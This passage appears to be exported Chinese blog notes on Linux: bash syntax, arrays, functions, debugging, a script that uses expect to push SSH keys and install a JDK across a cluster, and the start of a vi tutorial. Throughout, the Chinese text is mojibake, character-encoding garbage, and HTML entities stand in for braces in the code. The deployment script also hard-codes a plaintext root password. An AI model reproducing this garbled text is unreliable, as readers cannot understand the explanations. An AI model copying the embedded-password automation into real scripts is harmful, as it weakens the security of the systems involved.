æ£€æµ‹æ–‡ä»¶ï¼ˆåŒ…æ‹¬ç›®å½•ï¼‰æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true -s æ£€æµ‹æ–‡ä»¶æ˜¯å¦ä¸ºç©ºï¼ˆæ–‡ä»¶å¤§å°æ˜¯å¦å¤§äº0ï¼‰ï¼Œä¸ä¸ºç©ºè¿”å›true -r æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯è¯»ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true -w æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯å†™ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true -x æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true -b æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯å—è®¾å¤‡æ–‡ä»¶ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true -c æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯å­—ç¬¦è®¾å¤‡æ–‡ä»¶ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true 2.3ã€æµç¨‹æ§åˆ¶2.3.1ã€ifif.. then ..elif.. then.. else..fi123456789101112131415161718192021222324252627282930313233343536# ifè¯­æ³•æ ¼å¼ï¼šif conditionthen statements [elif condition then statements. ..] [else statements ] fi# ç¤ºä¾‹ç¨‹åºï¼š[root@hadoop02 bin]# vi g.sh#!/bin/bash## read a value for NAME from stdinread -p "please input your name:" NAME## printf '%s\n' $NAMEif [ $NAME = root ]thenecho "hello $&#123;NAME&#125;, welcome !"elif [ $NAME = hadoop ]then echo "hello $&#123;NAME&#125;, welcome !"else echo "I donâ€™t know you !"fi## è§„åˆ™è§£é‡Š[ condition ] (æ³¨ï¼šconditionå‰åè¦æœ‰ç©ºæ ¼)#éç©ºè¿”å›trueï¼Œå¯ä½¿ç”¨$?éªŒè¯ï¼ˆ0ä¸ºtrueï¼Œ&gt;1ä¸ºfalseï¼‰[ hadoop ]#ç©ºè¿”å›false[ ]# æ³¨æ„[ ]å†…éƒ¨çš„=å‘¨è¾¹çš„ç©ºæ ¼ ä¸‰å…ƒè¿ç®—ç¬¦12[ condition ] &amp;&amp; echo OK || echo notok# æ¡ä»¶æ»¡è¶³ï¼Œæ‰§è¡Œ&amp;&amp;åé¢çš„è¯­å¥ï¼›æ¡ä»¶ä¸æ»¡è¶³ï¼Œæ‰§è¡Œ||åé¢çš„è¯­å¥ æ¡ä»¶åˆ¤æ–­ç»„åˆ æ¡ä»¶åˆ¤æ–­ç»„åˆæœ‰ä¸¤ç§ä½¿ç”¨æ–¹å¼ï¼š [] å’Œ [[]] æ³¨æ„å®ƒä»¬çš„åŒºåˆ«ï¼š [[ ]] ä¸­é€»è¾‘ç»„åˆå¯ä»¥ä½¿ç”¨ &amp;&amp; || ç¬¦å· [] é‡Œé¢é€»è¾‘ç»„åˆå¯ä»¥ç”¨ -a -o å¸¸ç”¨åˆ¤æ–­è¿ç®—ç¬¦1. å­—ç¬¦ä¸²æ¯”è¾ƒ = åˆ¤æ–­ç›¸ç­‰!= åˆ¤æ–­ä¸ç›¸ç­‰-z å­—ç¬¦ä¸²é•¿åº¦æ˜¯ä¸º0è¿”å›true-n å­—ç¬¦ä¸²é•¿åº¦æ˜¯ä¸ä¸º0è¿”å›true 2. æ•´æ•°æ¯”è¾ƒ -lt å°äº less than -le å°äºç­‰äº -eq ç­‰äº -gt å¤§äº great than -ge å¤§äºç­‰äº -ne ä¸ç­‰äº 3. æ–‡ä»¶åˆ¤æ–­ -d æ˜¯å¦ä¸ºç›®å½• if [ -d /bin ]; then echo ok; else echo notok;fi -f æ˜¯å¦ä¸ºæ–‡ä»¶ if [ -f /bin/ls ]; then echo ok; else echo notok;fi -e æ˜¯å¦å­˜åœ¨ if [ -e /bin/ls ]; then echo ok; else echo notok;fi 2.3.2ã€while1234567891011121314151617181920212223242526while expressiondo command â€¦â€¦done----------------------i=1while ((i&lt;=3))do echo $i let i++done----------------------#!/bin/bashi=1while [ $i -le 3 ]do echo $i let i++done# å‘½ä»¤æ‰§è¡Œå®Œæ¯•ï¼Œæ§åˆ¶è¿”å›å¾ªç¯é¡¶éƒ¨ï¼Œä»å¤´å¼€å§‹ç›´è‡³æµ‹è¯•æ¡ä»¶ä¸ºå‡# æ¢ç§æ–¹å¼ï¼šå¾ªç¯ä½“ä¼šä¸€ç›´æ‰§è¡Œï¼Œç›´åˆ°æ¡ä»¶è¡¨è¾¾å¼expressionä¸ºfalse# æ³¨æ„ï¼šä¸Šè¿°let i++ å¯ä»¥å†™æˆ i=$(($i+1))æˆ–è€…i=$((i+1)) 2.3.3ã€caseCaseè¯­æ³•ï¼ˆé€šè¿‡ä¸‹é¢è¿™ä¸ªä¾‹å­å±•ç¤ºï¼‰ï¼š 12345678910case $1 instart) echo "starting" ;;stop) echo "stoping" ;;*) echo "Usage: &#123;start|stop&#125;"esac 2.3.4ã€forè¯­æ³•æ ¼å¼ï¼š 1234567for å˜é‡ in åˆ—è¡¨docommandâ€¦â€¦done# åˆ—è¡¨æ˜¯ä¸€ç»„å€¼ï¼ˆæ•°å­—ã€å­—ç¬¦ä¸²ç­‰ï¼‰ç»„æˆçš„åºåˆ—ï¼Œæ¯ä¸ªå€¼é€šè¿‡ç©ºæ ¼åˆ†éš”ã€‚æ¯å¾ªç¯ä¸€æ¬¡ï¼Œå°±å°†åˆ—è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªå€¼èµ‹ç»™å˜é‡ ä¸‰ç§æ–¹å¼ 12345678# æ–¹å¼1for N in 1 2 3; do echo $N; done# æ–¹å¼2for N in &#123;1..3&#125;; do echo $N; done# æ–¹å¼3for ((i=0; i&lt;=2; i++)); do echo "welcome $i times"; done 2.3.5ã€utilè¯­æ³•ç»“æ„ï¼š 123456789101112131415161718192021222324until expressiondo command â€¦â€¦done# expressionä¸€èˆ¬ä¸ºæ¡ä»¶è¡¨è¾¾å¼ï¼Œå¦‚æœè¿”å›å€¼ä¸º falseï¼Œåˆ™ç»§ç»­æ‰§è¡Œå¾ªç¯ä½“å†…çš„è¯­å¥ï¼Œå¦åˆ™è·³å‡ºå¾ªç¯ã€‚# æ¢ç§æ–¹å¼è¯´ï¼šå¾ªç¯ä½“ä¼šä¸€ç›´æ‰§è¡Œï¼Œç›´åˆ°æ¡ä»¶è¡¨è¾¾å¼expressionä¸ºtrue## ç¤ºä¾‹#!/bin/bash## vi util.sha=0until [ ! $a -lt 3 ]do echo $a a=`expr $a + 1`done----è¾“å‡º: 012 2.4ã€æ•°ç»„åœ¨Shellä¸­ï¼Œç”¨æ‹¬å·æ¥è¡¨ç¤ºæ•°ç»„ï¼Œæ•°ç»„å…ƒç´ ç”¨â€œç©ºæ ¼â€ç¬¦å·åˆ†å‰²å¼€ã€‚å®šä¹‰æ•°ç»„çš„ä¸€èˆ¬å½¢å¼ä¸º 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061array_name=(value1 ... valuen)ä¾‹å­ï¼šmingxing=(huangbo xuzheng wangbaoqiang)ä¹Ÿå¯ä»¥å•ç‹¬å®šä¹‰ï¼šmingxing[3]=liujialingè¯»å–æ•°ç»„å…ƒç´ çš„æ ¼å¼æ˜¯ï¼š$&#123;array_name[index]&#125;============================================# è·å–æ•°ç»„ä¸‹æ ‡ï¼š å‰é¢åŠ  `!`[linux@linux ~]$ echo $&#123;!mingxing[@]&#125; æˆ–è€…[linux@linux ~]$ echo $&#123;!mingxing[*]&#125;---è¾“å‡º: 0 1 2 3============================================# è¾“å‡ºæ•°ç»„çš„æ‰€æœ‰å…ƒç´ ï¼šç›´æ¥å–å€¼[linux@linux ~]$ echo $&#123;mingxing[*]&#125;[linux@linux ~]$ echo $&#123;mingxing[@]&#125;============================================# è·å–æ•°ç»„çš„é•¿åº¦ï¼š`#` [linux@linux ~]$ echo $&#123;#mingxing[*]&#125;[linux@linux ~]$ echo $&#123;#mingxing[@]&#125;============================================# æ•°ç»„å¯¹æ¥: æ·»åŠ æ–°çš„å€¼[linux@linux ~]$ mingxing+=(liuyifei liuyufeng)============================================# åˆ é™¤æ•°ç»„å…ƒç´ ï¼Œä½†æ˜¯ä¼šä¿ç•™æ•°ç»„å¯¹åº”ä½ç½®ï¼Œå°±æ˜¯è¯¥å€¼çš„ä¸‹æ ‡ä¾ç„¶ä¼šä¿ç•™ï¼Œä¼šç©ºç€ï¼Œä¹‹åï¼Œè¿˜å¯ä»¥å¡«å……å…¶ä»–çš„å€¼è¿›æ¥ã€‚# åˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´ ï¼šä¹‹å $&#123;mingxing[0]&#125; å°±æ˜¯ç©ºå€¼äº†[linux@linux ~]$ unset mingxing[0]============================================# éå†æ•°ç»„ï¼š#!/bin/bashIP=(192.168.1.1 192.168.1.2 192.168.1.3)# ç¬¬ä¸€ç§æ–¹å¼for ((i=0;i&lt;$&#123;#IP[*]&#125;;i++))doecho $&#123;IP[$i]&#125;done#ç¬¬äºŒç§æ–¹å¼for ip in $&#123;IP[*]&#125;do echo $ipdone============================================# æ•°ç»„çš„åˆ†ç‰‡ï¼š$&#123;arr[@]:number1:number2&#125;è¿™é‡Œnumber1ä»ä¸‹æ ‡number1å¼€å§‹å–å€¼ï¼Œnumber2å¾€åå–å‡ ä¸ªå…ƒç´ ï¼Œå³å–åˆ°çš„æ–°çš„æ•°ç»„çš„é•¿åº¦---cts1 ~ # arr=(1 2 3 4 5 6 7)cts1 ~ # echo "&#123;arr[@]:0:3&#125; --- $&#123;arr[@]:0:3&#125; "&#123;arr[@]:0:3&#125; --- 1 2 3cts1 ~ # echo "&#123;arr[@]:3:3&#125; --- $&#123;arr[@]:3:3&#125; "&#123;arr[@]:3:3&#125; --- 4 5 6cts1 ~ # echo "&#123;arr[@]:4:3&#125; --- $&#123;arr[@]:4:3&#125; "&#123;arr[@]:4:3&#125; --- 5 6 7 2.5ã€å‡½æ•°ä½¿ç”¨å‡½æ•°çš„è¯­æ³•ä½¿ç”¨ç¤ºä¾‹ : 1234567891011121314[root@hadoop02 bin]# vi i.sh #!/bin/shhello()&#123; echo "`date +%Y-%m-%d`" # return 2&#125;helloecho â€œhuangboâ€ # echo $?A="mazhonghua"echo $A---æ‰§è¡Œç»“æœ----â€œhuangboâ€mazhonghua å‡½æ•°çš„è°ƒç”¨æ–¹å¼å°±æ˜¯ç›´æ¥å†™å‡½æ•°åå°±OKäº† 123æ³¨æ„ï¼š1ã€å¿…é¡»åœ¨è°ƒç”¨å‡½æ•°åœ°æ–¹ä¹‹å‰ï¼Œå…ˆå£°æ˜å‡½æ•°ï¼Œshellè„šæœ¬æ˜¯é€è¡Œè¿è¡Œã€‚ä¸ä¼šåƒå…¶å®ƒè¯­è¨€ä¸€æ ·å…ˆé¢„ç¼–è¯‘2ã€å‡½æ•°è¿”å›å€¼ï¼Œåªèƒ½é€šè¿‡$? ç³»ç»Ÿå˜é‡è·å¾—ï¼Œå¯ä»¥æ˜¾ç¤ºåŠ ï¼šreturn è¿”å›ï¼Œå¦‚æœä¸åŠ ï¼Œå°†ä»¥æœ€åä¸€æ¡å‘½ä»¤è¿è¡Œç»“æœï¼Œä½œä¸ºè¿”å›å€¼ã€‚ returnåè·Ÿæ•°å€¼n(0-255) è„šæœ¬è°ƒè¯•ï¼š ä½¿ç”¨-xé€‰é¡¹è·Ÿè¸ªè„šæœ¬è°ƒè¯•shellè„šæœ¬ï¼Œèƒ½æ‰“å°å‡ºæ‰€æ‰§è¡Œçš„æ¯ä¸€è¡Œå‘½ä»¤ä»¥åŠå½“å‰çŠ¶æ€ sh -x i.sh æˆ–è€…åœ¨ä»£ç ä¸­åŠ å…¥ï¼šset -x 12345678910111213cts1 Desktop # sh -x i.sh+ hello++ date +%Y-%m-%d+ echo 2018-05-292018-05-29+ return 2+ echo $'\342\200\234huangbo\342\200\235'â€œhuangboâ€+ echo 00+ A=mazhonghua+ echo mazhonghuamazhonghua 2.6ã€å‡½æ•°å‚æ•°ç›´æ¥ä¸Šä»£ç  123456789101112131415161718192021222324vim funcWithParam.sh--------shæ–‡ä»¶--------#!/bin/bash# filename=funcWithParamfuncWithParam()&#123; echo "ç¬¬ä¸€ä¸ªå‚æ•°ä¸º $1 !" echo "ç¬¬äºŒä¸ªå‚æ•°ä¸º $2 !" echo "ç¬¬åä¸ªå‚æ•°ä¸º $10 !" echo "ç¬¬åä¸ªå‚æ•°ä¸º $&#123;10&#125; !" echo "ç¬¬åä¸€ä¸ªå‚æ•°ä¸º $&#123;11&#125; !" echo "å‚æ•°æ€»æ•°æœ‰ $# ä¸ª!" echo "ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæ‰€æœ‰å‚æ•° $* !"&#125;funcWithParam 1 2 3 4 5 6 7 8 9 34 73--------------------# è°ƒç”¨cts1 Desktop # sh funcWithParam.shç¬¬ä¸€ä¸ªå‚æ•°ä¸º 1 !ç¬¬äºŒä¸ªå‚æ•°ä¸º 2 !ç¬¬åä¸ªå‚æ•°ä¸º 10 !ç¬¬åä¸ªå‚æ•°ä¸º 34 !ç¬¬åä¸€ä¸ªå‚æ•°ä¸º 73 !å‚æ•°æ€»æ•°æœ‰ 11 ä¸ª!ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæ‰€æœ‰å‚æ•° 1 2 3 4 5 6 7 8 9 34 73 ! 2.7ã€è·¨è„šæœ¬è°ƒç”¨å‡½æ•°ç¼–å†™ä¸€ä¸ªbase.shè„šæœ¬ï¼Œé‡Œé¢æ”¾æ”¾ä¸€ä¸ªtestå‡½æ•° 123456vim base.sh------#!/bin/bashtest()&#123; echo "hello"&#125; å†ç¼–å†™ä¸€ä¸ªother.shè„šæœ¬ï¼Œé‡Œé¢å¼•å…¥base.shè„šæœ¬ï¼Œå¹¶ä¸”è°ƒç”¨testå‡½æ•°ï¼š 12345678910111213vim other.sh--------#!/bin/bashsource base.sh ## å¼•å…¥è„šæœ¬test ##è°ƒç”¨å¼•å…¥è„šæœ¬å½“ä¸­çš„testå‡½æ•°============================================# æ‰§è¡Œcts1 Desktop # sh other.shother.sh: line 2: ./base.sh: æƒé™ä¸å¤Ÿcts1 Desktop # chmod 755 other.sh base.shcts1 Desktop # ./other.shhello 3ã€Shellç»¼åˆæ¡ˆä¾‹3.1ã€æ‰“å°9*9ä¹˜æ³•è¡¨ç¤ºä¾‹ä»£ç ï¼š 12345678910111213141516171819202122232425#!/bin/bashfor((i=1;i&lt;=9;++i))do for((j=1;j&lt;=i;j++)) do echo -ne "$i*$j=$((i*j))\t" done echodone# è§£é‡Š-n ä¸åŠ æ¢è¡Œç¬¦-e è§£é‡Šè½¬ä¹‰ç¬¦echo æ¢è¡Œæ•ˆæœ: 1*1=12*1=2 2*2=43*1=3 3*2=6 3*3=94*1=4 4*2=8 4*3=12 4*4=165*1=5 5*2=10 5*3=15 5*4=20 5*5=256*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=367*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=498*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=649*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81 3.2ã€è‡ªåŠ¨éƒ¨ç½²é›†ç¾¤çš„JDK1ã€ éœ€æ±‚æè¿° 12å…¬å¸å†…æœ‰ä¸€ä¸ªNä¸ªèŠ‚ç‚¹çš„é›†ç¾¤ï¼Œéœ€è¦ç»Ÿä¸€å®‰è£…ä¸€äº›è½¯ä»¶ï¼ˆjdkï¼‰éœ€è¦å¼€å‘ä¸€ä¸ªè„šæœ¬ï¼Œå®ç°å¯¹é›†ç¾¤ä¸­çš„Nå°èŠ‚ç‚¹æ‰¹é‡è‡ªåŠ¨ä¸‹è½½ã€å®‰è£…jdk 2ã€ æ€è·¯ æ€è€ƒä¸€ä¸‹ï¼šæˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªJDKå®‰è£…åŒ…åœ¨ä¸€å°æœåŠ¡å™¨ä¸Šã€‚é‚£æˆ‘ä»¬è¦å®ç°è¿™ä¸ªç›®æ ‡ï¼š 1231ã€ æŠŠåŒ…ä¼ åˆ°æ¯å°æœåŠ¡å™¨ï¼Œæˆ–è€…é€šè¿‡æœ¬åœ°yumæºçš„æ–¹å¼å»æœåŠ¡å™¨å–2ã€ ç»™æ¯å°ä¸€å°æœºå™¨å‘é€ä¸€ä¸ªå®‰è£…è„šæœ¬ï¼Œå¹¶ä¸”è®©è„šæœ¬è‡ªå·±æ‰§è¡Œ3. è¦å†™ä¸€ä¸ªå¯åŠ¨è„šæœ¬ï¼Œç”¨æ¥æ‰§è¡Œä»¥ä¸Šä¸¤éƒ¨æ“ä½œ 3ã€ Expect**çš„ä½¿ç”¨** è›‹ç–¼ç‚¹ï¼šå‡å¦‚åœ¨æ²¡æœ‰é…ç½®SSHå…å¯†ç™»å½•çš„å‰æä¸‹ï¼Œæˆ‘ä»¬è¦è¦æ˜¯scpå‘½ä»¤ä»ä¸€å°æœºå™¨æ‹·è´æ–‡ä»¶å¤¹åˆ°å¦å¤–çš„æœºå™¨ï¼Œä¼šæœ‰äººæœºäº¤äº’è¿‡ç¨‹ï¼Œé‚£æˆ‘ä»¬æ€ä¹ˆè®©æœºå™¨è‡ªå·±å®ç°äººæœºäº¤äº’ï¼Ÿ çµä¸¹å¦™è¯ï¼šexpect å‘½ä»¤ æè¿° set å¯ä»¥è®¾ç½®è¶…æ—¶ï¼Œä¹Ÿå¯ä»¥è®¾ç½®å˜é‡ timeout è¶…æ—¶ç­‰å¾…æ—¶é—´ï¼Œé»˜è®¤ 10s spawn æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ send æ‰§è¡Œäº¤äº’ï¼Œç›¸å½“äºæ‰‹åŠ¨è¾“å…¥ expect â€œâ€ï¼ˆexpectå†…éƒ¨å‘½ä»¤ï¼‰ åŒ¹é…è¾“å‡ºçš„å†…å®¹ exp_continue ç»§ç»­æ‰§è¡Œä¸‹é¢åŒ¹é… æ€è·¯ï¼šæ¨¡æ‹Ÿè¯¥äººæœºäº¤äº’è¿‡ç¨‹ï¼Œåœ¨éœ€è¦äº¤äº’çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡æˆ‘ä»¬çš„æ£€æµ‹ç»™è¾“å…¥æå‰å‡†å¤‡å¥½çš„å€¼å³å¯ ç¤ºä¾‹ï¼šè§‚çœ‹é…ç½®SSHå…å¯†ç™»å½•çš„è¿‡ç¨‹ å®ç°è„šæœ¬ï¼š 123456789101112131415161718vi testExpect.sh## å®šä¹‰ä¸€ä¸ªå‡½æ•°sshcopyid()&#123; expect -c " spawn ssh-copy-id $1 expect &#123; \"(yes/no)?\" &#123;send \"yes\r\";exp_continue&#125; \"password:\" &#123;send \"$2\r\";exp_continue&#125; &#125; "&#125;## è°ƒç”¨å‡½æ•°æ‰§è¡Œsshcopyid $1 $2# æ³¨æ„ï¼šå¦‚æœæœºå™¨æ²¡æœ‰expectï¼Œåˆ™è¯·å…ˆå®‰è£…expectyum install -y expect 4ã€ è„šæœ¬å®ç° å¯åŠ¨è„šæœ¬initInstallJDK.sh 12345678910111213141516171819202122232425262728293031#!/bin/bashSERVERS="192.168.123.201"PASSWORD=hadoopBASE_SERVER=192.168.123.202auto_ssh_copy_id() &#123; expect -c "set timeout -1; spawn ssh-copy-id $1; expect &#123; *(yes/no)* &#123;send -- yes\r;exp_continue;&#125; *password:* &#123;send -- $2\r;exp_continue;&#125; eof &#123;exit 0;&#125; &#125;";&#125;ssh_copy_id_to_all() &#123; for SERVER in $SERVERS do auto_ssh_copy_id $SERVER $PASSWORD done&#125;ssh_copy_id_to_allfor SERVER in $SERVERSdo scp installJDK.sh root@$SERVER:/root ssh root@$SERVER chmod 755 installJDK.sh ssh root@$SERVER /root/installJDK.shdone å®‰è£…è„šæœ¬installJDK.sh 1234567891011#!/bin/bashBASE_SERVER=192.168.123.202yum install -y wgetwget $BASE_SERVER/soft/jdk-8u73-linux-x64.tar.gztar -zxvf jdk-8u73-linux-x64.tar.gz -C /usr/localcat &gt;&gt; /etc/profile &lt;&lt;EOFexport JAVA_HOME=/usr/local/jdk1.8.0_73export PATH=\$PATH:\$JAVA_HOME/binEOF 4ã€æ€»ç»“å†™è„šæœ¬æ³¨æ„äº‹é¡¹ï¼š 1ã€å¼€å¤´åŠ è§£é‡Šå™¨ï¼š #!/bin/bashï¼Œå’Œæ³¨é‡Šè¯´æ˜ã€‚ 2ã€å‘½åå»ºè®®è§„åˆ™ï¼šå˜é‡åå¤§å†™ã€å±€éƒ¨å˜é‡å°å†™ï¼Œå‡½æ•°åå°å†™ï¼Œåå­—ä½“ç°å‡ºå®é™…ä½œç”¨ã€‚ 3ã€é»˜è®¤å˜é‡æ˜¯å…¨å±€çš„ï¼Œåœ¨å‡½æ•°ä¸­å˜é‡ local æŒ‡å®šä¸ºå±€éƒ¨å˜é‡ï¼Œé¿å…æ±¡æŸ“å…¶ä»–ä½œç”¨åŸŸã€‚ 4ã€set -e é‡åˆ°æ‰§è¡Œé 0 æ—¶é€€å‡ºè„šæœ¬ï¼Œ set -x æ‰“å°æ‰§è¡Œè¿‡ç¨‹ã€‚ 5ã€å†™è„šæœ¬ä¸€å®šå…ˆæµ‹è¯•å†åˆ°ç”Ÿäº§ä¸Šã€‚]]></content>
      <categories>
        <category>Linux</category>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linuxå­¦ä¹ ç¬”è®°-2]]></title>
    <url>%2F2018%2F05%2F27%2FLinux%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2%2F</url>
    <content type="text"><![CDATA[1. VIæ–‡æœ¬ç¼–è¾‘å™¨å­¦ä¼šä½¿ç”¨viç¼–è¾‘å™¨æ˜¯å­¦ä¹ Linuxç³»ç»Ÿçš„å¿…å¤‡æŠ€æœ¯ä¹‹ä¸€ï¼Œå› ä¸ºä¸€èˆ¬çš„LinuxæœåŠ¡å™¨æ˜¯æ²¡æœ‰GUIç•Œé¢çš„ï¼ŒLinuxè¿ç»´åŠå¼€å‘äººå‘˜åŸºæœ¬ä¸Šéƒ½æ˜¯é€šè¿‡å‘½ä»¤è¡Œçš„æ–¹å¼è¿›è¡Œæ–‡æœ¬ç¼–è¾‘æˆ–ç¨‹åºç¼–å†™çš„ã€‚viç¼–è¾‘å™¨æ˜¯Linuxå†…ç½®çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå‡ ä¹æ‰€æœ‰çš„ç±»unixç³»ç»Ÿä¸­éƒ½å†…ç½®äº†viç¼–è¾‘å™¨ï¼Œè€Œå…¶å®ƒç¼–è¾‘å™¨åˆ™ä¸ä¸€å®šï¼Œå¦å¤–å¾ˆå¤šè½¯ä»¶ä¼šè°ƒç”¨viç¼–è¾‘è¿›è¡Œå†…å®¹ç¼–å†™ï¼Œä¾‹å¦‚crontabå®šæ—¶ä»»åŠ¡ã€‚è¾ƒä¹‹äºå…¶å®ƒç¼–è¾‘å™¨æˆ–GUIç¼–è¾‘å™¨ï¼Œviç¼–è¾‘é€Ÿåº¦æ˜¯æœ€å¿«çš„ã€‚VIMæ˜¯å®ƒçš„å¢å¼ºç‰ˆæœ¬ï¼ŒVIæœ‰ä¸‰ç§åŸºæœ¬å·¥ä½œæ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯ï¼š å‘½ä»¤æ¨¡å¼ï¼ˆcommand modeï¼‰ã€æˆ–è€…å«ä¸€èˆ¬æ¨¡å¼ æ’å…¥æ¨¡å¼ï¼ˆinsert modeï¼‰ã€æˆ–è€…å«ç¼–è¾‘æ¨¡å¼ åº•è¡Œæ¨¡å¼ï¼ˆlast line modeï¼‰ã€æˆ–è€…å«å‘½ä»¤è¡Œæ¨¡å¼ 1. æœ€åŸºæœ¬ç”¨æ³• 1ã€é¦–å…ˆä¼šè¿›å…¥â€œä¸€èˆ¬æ¨¡å¼â€ï¼Œæ­¤æ¨¡å¼åªæ¥å—å„ç§å‘½ä»¤å¿«æ·é”®ï¼Œä¸èƒ½ç¼–è¾‘æ–‡ä»¶å†…å®¹ 2ã€æŒ‰ié”®ï¼Œå°±ä¼šä»ä¸€èˆ¬æ¨¡å¼è¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œæ­¤æ¨¡å¼ä¸‹ï¼Œæ•²å…¥çš„éƒ½æ˜¯æ–‡ä»¶å†…å®¹ 3ã€ç¼–è¾‘å®Œæˆä¹‹åï¼ŒæŒ‰Escé”®é€€å‡ºç¼–è¾‘æ¨¡å¼ï¼Œå›åˆ°ä¸€èˆ¬æ¨¡å¼ 4ã€å†æŒ‰ï¼šï¼Œè¿›å…¥â€œåº•è¡Œå‘½ä»¤æ¨¡å¼â€ï¼Œè¾“å…¥wqå‘½ä»¤ï¼Œå›è½¦å³å¯ä¿å­˜é€€å‡º 2. ç§»åŠ¨å…‰æ ‡ (ä¸€èˆ¬æ¨¡å¼) 1ã€ ä½¿ç”¨ä¸Šä¸‹å·¦å³é”®å¯ä»¥ç§»åŠ¨å…‰æ ‡ 2ã€ ä½¿ç”¨h,j,k,lï¼Œä¾æ¬¡æ˜¯å‘å·¦ï¼Œä¸‹ï¼Œä¸Šï¼Œå³ç§»åŠ¨ 3ã€ wï¼šå°†å…‰æ ‡ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå•è¯çš„é¦–å­—æ¯å¤„ 4ã€ Wï¼šåˆ©ç”¨ç©ºæ ¼å‘åç§»åŠ¨å…‰æ ‡ï¼Œå°±æ˜¯å¿½ç•¥æ ‡ç‚¹ 5ã€ bï¼šåˆ©ç”¨wordåŒ…æ‹¬æ ‡ç‚¹å‘å‰ç§»åŠ¨å…‰æ ‡, ä¸wç›¸å¯¹åº” 6ã€ Bï¼šåˆ©ç”¨ç©ºæ ¼å‘å‰ç§»åŠ¨å…‰æ ‡ï¼Œå¿½ç•¥æ ‡ç‚¹ 7ã€ eï¼šå°†å…‰æ ‡ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªwordçš„å°¾éƒ¨ï¼ŒåŒ…æ‹¬ç¬¦å· 8ã€ E: å°†å…‰æ ‡ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªç©ºæ ¼åˆ†éš”å­—çš„å°¾éƒ¨ 9ã€ (ï¼šç§»åŠ¨åˆ°å¥å­å¼€å§‹ 10ã€ )ï¼šç§»åŠ¨åˆ°å¥å­ç»“æŸ 11ã€ 0ï¼šç§»åŠ¨å…‰æ ‡åˆ°æœ¬å¥å¥é¦– 12ã€ $ï¼šç§»åŠ¨å…‰æ ‡åˆ°æœ¬è¡Œè¡Œå°¾ 13ã€ {ï¼šç§»åŠ¨åˆ°æ®µè½å¼€å§‹ 14ã€ }ï¼šç§»åŠ¨åˆ°æ®µè½ç»“æŸ 15ã€ Hï¼šå±å¹•é¡¶ç«¯ 16ã€ Lï¼šå±å¹•åº•ç«¯ 17ã€ Mï¼šç§»åŠ¨åˆ°å±å¹•ä¸­å¤®ä½ç½® 18ã€ ggï¼šç›´æ¥è·³åˆ°æ–‡ä»¶çš„é¦–è¡Œè¡Œé¦– 19ã€ Gï¼šç›´æ¥è·³åˆ°æ–‡ä»¶çš„æœ«è¡Œè¡Œé¦– 20ã€ æœ€å¼ºå…‰æ ‡ç§»åŠ¨ï¼š % : åŒ¹é…æ‹¬å·ç§»åŠ¨ï¼ŒåŒ…æ‹¬(, {, [.ï¼ˆä½ éœ€è¦æŠŠå…‰æ ‡å…ˆç§»åˆ°æ‹¬å·ä¸Šï¼‰ *: åŒ¹é…å…‰æ ‡å½“å‰æ‰€åœ¨çš„å•è¯ï¼Œç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€ä¸ªåŒ¹é…å•è¯ #: åŒ¹é…å…‰æ ‡å½“å‰æ‰€åœ¨çš„å•è¯ï¼Œç§»åŠ¨å…‰æ ‡åˆ°ä¸Šä¸€ä¸ªåŒ¹é…å•è¯ é‡ç‚¹æ€»ç»“: h l : å·¦å³, j k : ä¸‹ä¸Š. w: ä¸‹ä¸€ä¸ªå•è¯ , b: ä¸Šä¸€ä¸ªå•è¯. 0: æœ¬è¡Œè¡Œé¦–, $: æœ¬è¡Œè¡Œå°¾ (: å¥å­å¼€å§‹, ): å¥å­ç»“æŸ {: æ®µè½å¼€å§‹ }: æ®µè½ç»“æŸ gg: æ–‡ä»¶è¡Œé¦– G: æ–‡ä»¶è¡Œå°¾ %: ä¸‹ä¸€ä¸ªæ‹¬å· *: ä¸‹ä¸€ä¸ªå•è¯ #: ä¸Šä¸€ä¸ªå•è¯ 3. å¸¸ç”¨æ“ä½œ(ä¸€èˆ¬æ¨¡å¼ &gt;&gt; æ’å…¥æ¨¡å¼) å•ä½ æŒ‡ä»¤1 æŒ‡ä»¤2 å½“å‰ä½ å‰ä¸€ä½/åä¸€ä½ i: åœ¨å…‰æ ‡å‰ä¸€ä½å¼€å§‹æ’å…¥ a: å…‰æ ‡åä¸€ä½å¼€å§‹æ’å…¥ å½“å‰è¡Œ æœ€å‰/æœ€å I: åœ¨è¯¥è¡Œçš„æœ€å‰é¢æ’å…¥ A: åœ¨è¯¥è¡Œçš„æœ€åæ’å…¥ å½“å‰è¡Œ 